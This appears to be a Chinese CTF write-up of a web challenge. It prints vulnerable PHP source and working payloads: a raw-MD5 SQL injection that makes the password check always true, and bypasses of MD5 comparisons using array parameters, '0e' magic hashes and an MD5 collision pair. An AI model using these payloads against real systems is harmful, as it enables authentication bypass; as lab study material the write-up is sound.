# 知识点：

# 1. 信息收集，响应报文头观察

# 2. md5处理数组报错，绕过

# 3. MD5碰撞



1. 进入界面很懵逼，各种后台扫描也没有什么源码，备份之类的，找不到思路

后面看wp发现，响应头有提示。。。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/3C9B80733B2249D8AC37F4F8215EFD1Bclipboard.png)



2. password经过了md5的加密，联想到实验吧一个题可以md5之后，含有or造成sql注入

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/88CFA4E7C772414081F6EAFC96719971clipboard.png)



```javascript
select * from 'admin' where password=''or'6�]��!r,��b'
```

此时成了永真。达到了sql注入目的



3.然后提示/levels91.php页面的存在

查看网页发现源码：

```javascript
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```



这里有三种方法绕过，

3.1 数组绕过md5无法处理数组，会返回假，两个假相等达到绕过目的

payload:

```javascript
?a[]=1&b[]=2
```



3.2 md5碰撞

```javascript
?a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 
```



3.3 两个加密后0e开头的字符串

```javascript
?a=QNKCDZO&b=240610708
```



然后有提示存在levell14.php页面



4. 发现levell14.phpd源码

```javascript
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```



发现变成了强等于

MD5碰撞即可

```javascript
post:
    param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

